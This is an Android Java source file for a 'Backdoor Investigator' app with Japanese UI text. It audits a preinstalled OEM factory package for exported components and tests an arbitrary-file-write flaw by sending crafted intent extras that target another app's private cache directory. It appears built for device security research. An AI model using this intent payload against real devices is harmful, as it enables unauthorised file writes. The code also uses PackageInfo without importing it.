package com.backdoor.investigator;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private Button btnStart, btnStop;
    private TextView tvLog, tvStatus;
    private TestTask testTask;
    private StringBuilder logBuilder = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);
        tvLog = findViewById(R.id.tv_log);
        tvStatus = findViewById(R.id.tv_status);

        btnStart.setOnClickListener(v -> startInvestigation());
        btnStop.setOnClickListener(v -> stopInvestigation());

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    PERMISSION_REQUEST_CODE);
        }
    }

    private void startInvestigation() {
        if (testTask != null && testTask.getStatus() != AsyncTask.Status.FINISHED) {
            Toast.makeText(this, "すでに実行中です", Toast.LENGTH_SHORT).show();
            return;
        }
        logBuilder.setLength(0);
        tvLog.setText("調査開始...");
        btnStart.setEnabled(false);
        btnStop.setEnabled(true);
        tvStatus.setText("実行中...");
        testTask = new TestTask();
        testTask.execute();
    }

    private void stopInvestigation() {
        if (testTask != null && testTask.getStatus() != AsyncTask.Status.FINISHED) {
            testTask.cancel(true);
            btnStart.setEnabled(true);
            btnStop.setEnabled(false);
            tvStatus.setText("中断");
            Toast.makeText(this, "調査を中断しました", Toast.LENGTH_SHORT).show();
            saveLogToFile();
        }
    }

    private void updateLog(final String line) {
        runOnUiThread(() -> {
            logBuilder.append(line).append("\n");
            tvLog.append(line).append("\n");
            final int scrollAmount = tvLog.getLayout() != null ? tvLog.getLayout().getLineTop(tvLog.getLineCount()) - tvLog.getHeight() : 0;
            if (scrollAmount > 0) {
                tvLog.scrollTo(0, scrollAmount);
            }
        });
    }

    private void saveLogToFile() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                Toast.makeText(this, "Downloadフォルダが作成できません", Toast.LENGTH_SHORT).show();
                return;
            }
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            File file = new File(dir, "backdoor_report_" + timestamp + ".txt");
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(logBuilder.toString().getBytes());
            fos.close();
            Toast.makeText(this, "ログ保存: " + file.getAbsolutePath(), Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(this, "ログ保存エラー: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            Log.e("BackdoorInvestigator", "saveLog error", e);
        }
    }

    private class TestTask extends AsyncTask<Void, String, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            publishProgress("===== バックドア調査開始 =====\n");
        }

        @Override
        protected Void doInBackground(Void... voids) {
            try {
                publishProgress("--- デバイス基本情報 ---");
                publishProgress("Androidバージョン: " + Build.VERSION.RELEASE);
                publishProgress("モデル: " + Build.MODEL);
                publishProgress("製造元: " + Build.MANUFACTURER);
                publishProgress("");

                publishProgress("--- パッケージ調査 ---");
                checkPackage("com.ape.factory");
                checkPackage("com.android.phone");
                checkPackage("com.android.settings");
                checkPackage("com.qualcomm.qcnvitems");

                publishProgress("--- コンポーネントのエクスポート状態 ---");
                checkComponent("com.ape.factory", "com.ape.factory.CQAtest.CQAActivity");
                checkComponent("com.ape.factory", "com.ape.factory.CommandService");
                checkComponent("com.ape.factory", "com.ape.factory.FTMReceiver");
                checkComponent("com.ape.factory", "com.ape.factory.Version");

                publishProgress("--- Version.java 任意ファイル書き込みテスト ---");
                testVersionFileWrite();

                publishProgress("--- その他 ---");
                publishProgress("--- システムプロパティ (読み取り) ---");
                readSystemProperty("ro.oem_unlock_supported");
                readSystemProperty("ro.product.name");
                readSystemProperty("persist.sys.FM_STATE");
                readSystemProperty("persist.sys.SENSOR_CAL_ACCEL");
                readSystemProperty("vendor.fp.device");

                publishProgress("--- ファイル読み取り (安全なもの) ---");
                readFile("/proc/version");
                readFile("/sys/class/leds/red/brightness");
                readFile("/sys/class/leds/green/brightness");

                publishProgress("--- NV/QMI クラスの存在確認 ---");
                checkClassExists("com.qualcomm.qcnvitems.QcNvItems");
                checkClassExists("com.qualcomm.qcnvitems.QmiNvItems");

                publishProgress("--- パーミッション確認 ---");
                checkPermission(Manifest.permission.READ_PHONE_STATE);
                checkPermission(Manifest.permission.WRITE_SETTINGS);
                checkPermission(Manifest.permission.WRITE_SECURE_SETTINGS);
                checkPermission(Manifest.permission.DIAGNOSTIC);

                publishProgress("\n===== 調査完了 =====\n");
            } catch (Exception e) {
                publishProgress("重大エラー: " + e.toString());
                Log.e("BackdoorInvestigator", "TestTask error", e);
            }
            return null;
        }

        private void testVersionFileWrite() {
            try {
                ComponentName versionComponent = new ComponentName("com.ape.factory", "com.ape.factory.Version");
                Intent intent = new Intent();
                intent.setComponent(versionComponent);
                PackageManager pm = getPackageManager();
                ResolveInfo ri = pm.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
                if (ri == null || ri.activityInfo == null) {
                    publishProgress("Version Activity は解決できません (エクスポートされていない可能性)");
                    return;
                }
                publishProgress("Version Activity はエクスポートされています (permission: " + ri.activityInfo.permission + ")");

                File externalFile = new File(getExternalFilesDir(null), "test_barcode_external.txt");
                File cacheTarget = new File("/data/data/com.ape.factory/cache/test_barcode_cache.txt");

                try {
                    if (externalFile.exists()) {
                        externalFile.delete();
                    }
                    intent.putExtra("writeBarcodeToFile", true);
                    intent.putExtra("pathToWriteBarcode", externalFile.getAbsolutePath());
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    publishProgress("Version Activity 起動 (外部書き込み) - 待機中...");
                    Thread.sleep(2000);
                    if (externalFile.exists()) {
                        String content = readFileContent(externalFile);
                        if (!TextUtils.isEmpty(content)) {
                            publishProgress("外部ファイル書き込み成功: " + externalFile.getAbsolutePath() + " 内容: " + content);
                        } else {
                            publishProgress("外部ファイルは存在しますが、内容が空です");
                        }
                    } else {
                        publishProgress("外部ファイルが作成されませんでした (書き込み失敗または権限不足)");
                    }
                } catch (Exception e) {
                    publishProgress("外部書き込みテスト中に例外: " + e.toString());
                }

                try {
                    intent = new Intent();
                    intent.setComponent(versionComponent);
                    intent.putExtra("writeBarcodeToFile", true);
                    intent.putExtra("pathToWriteBarcode", cacheTarget.getAbsolutePath());
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    publishProgress("Version Activity 起動 (cache書き込み) - 待機中...");
                    Thread.sleep(2000);
                    boolean cacheExists = false;
                    try {
                        cacheExists = cacheTarget.exists();
                    } catch (SecurityException se) {
                        publishProgress("cacheファイル存在確認でSecurityException: " + se.getMessage());
                    }
                    if (cacheExists) {
                        publishProgress("cacheファイルが存在します (書き込み成功の可能性)");
                        try {
                            String cacheContent = readFileContent(cacheTarget);
                            if (!TextUtils.isEmpty(cacheContent)) {
                                publishProgress("cacheファイル内容: " + cacheContent);
                            } else {
                                publishProgress("cacheファイルは空です");
                            }
                        } catch (Exception e2) {
                            publishProgress("cacheファイル読み取り失敗: " + e2.toString() + " (権限不足の可能性)");
                        }
                    } else {
                        publishProgress("cacheファイルが存在しません (書き込み失敗またはアクセス不可)");
                    }
                } catch (Exception e) {
                    publishProgress("cache書き込みテスト中に例外: " + e.toString());
                }

            } catch (Exception e) {
                publishProgress("Version テスト全体で例外: " + e.toString());
            }
        }

        private String readFileContent(File file) {
            try {
                FileInputStream fis = new FileInputStream(file);
                byte[] data = new byte[(int) file.length()];
                fis.read(data);
                fis.close();
                return new String(data);
            } catch (Exception e) {
                return null;
            }
        }

        private void checkPackage(String pkg) {
            try {
                PackageInfo info = getPackageManager().getPackageInfo(pkg, 0);
                publishProgress("パッケージ " + pkg + " はインストールされています (バージョン: " + info.versionName + ")");
            } catch (PackageManager.NameNotFoundException e) {
                publishProgress("パッケージ " + pkg + " はインストールされていません");
            }
        }

        private void checkComponent(String pkg, String cls) {
            try {
                ComponentName cn = new ComponentName(pkg, cls);
                Intent intent = new Intent();
                intent.setComponent(cn);
                ResolveInfo ri = getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
                if (ri != null && ri.activityInfo != null) {
                    publishProgress(cls + " : エクスポート=" + ri.activityInfo.exported + ", permission=" + ri.activityInfo.permission);
                    return;
                }
                ResolveInfo riSvc = getPackageManager().resolveService(intent, PackageManager.MATCH_DEFAULT_ONLY);
                if (riSvc != null && riSvc.serviceInfo != null) {
                    publishProgress(cls + " : エクスポート=" + riSvc.serviceInfo.exported + ", permission=" + riSvc.serviceInfo.permission);
                    return;
                }
                List<ResolveInfo> receivers = getPackageManager().queryBroadcastReceivers(intent, 0);
                if (receivers != null && !receivers.isEmpty()) {
                    for (ResolveInfo r : receivers) {
                        if (r.activityInfo != null && r.activityInfo.name.equals(cls)) {
                            publishProgress(cls + " : エクスポート=" + r.activityInfo.exported + ", permission=" + r.activityInfo.permission);
                            return;
                        }
                    }
                }
                publishProgress(cls + " : 解決できませんでした (非公開または存在しない)");
            } catch (Exception e) {
                publishProgress(cls + " 調査エラー: " + e.toString());
            }
        }

        private void readSystemProperty(String key) {
            try {
                Class<?> sp = Class.forName("android.os.SystemProperties");
                Method get = sp.getMethod("get", String.class);
                String value = (String) get.invoke(null, key);
                publishProgress(key + " = " + (value != null ? value : "(null)"));
            } catch (Exception e) {
                try {
                    Process process = Runtime.getRuntime().exec("getprop " + key);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line = reader.readLine();
                    reader.close();
                    publishProgress(key + " = " + (line != null ? line : "(null)"));
                } catch (Exception ex) {
                    publishProgress(key + " 読み取り失敗: " + ex.toString());
                }
            }
        }

        private void readFile(String path) {
            try {
                Process process = Runtime.getRuntime().exec("cat " + path);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                reader.close();
                String content = sb.toString().trim();
                if (content.isEmpty()) {
                    publishProgress(path + " : (空または読み取り不可)");
                } else {
                    publishProgress(path + " :\n" + content);
                }
            } catch (Exception e) {
                publishProgress(path + " 読み取りエラー: " + e.toString());
            }
        }

        private void checkClassExists(String className) {
            try {
                Class.forName(className);
                publishProgress(className + " はクラスパスに存在します");
            } catch (ClassNotFoundException e) {
                publishProgress(className + " はクラスパスに存在しません");
            }
        }

        private void checkPermission(String perm) {
            int result = ContextCompat.checkSelfPermission(MainActivity.this, perm);
            publishProgress(perm + " : " + (result == PackageManager.PERMISSION_GRANTED ? "許可済み" : "未許可"));
        }

        @Override
        protected void onProgressUpdate(String... values) {
            for (String line : values) {
                updateLog(line);
                tvStatus.setText(line);
            }
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            btnStart.setEnabled(true);
            btnStop.setEnabled(false);
            tvStatus.setText("完了");
            saveLogToFile();
        }

        @Override
        protected void onCancelled() {
            btnStart.setEnabled(true);
            btnStop.setEnabled(false);
            tvStatus.setText("中断");
            saveLogToFile();
        }
    }
}
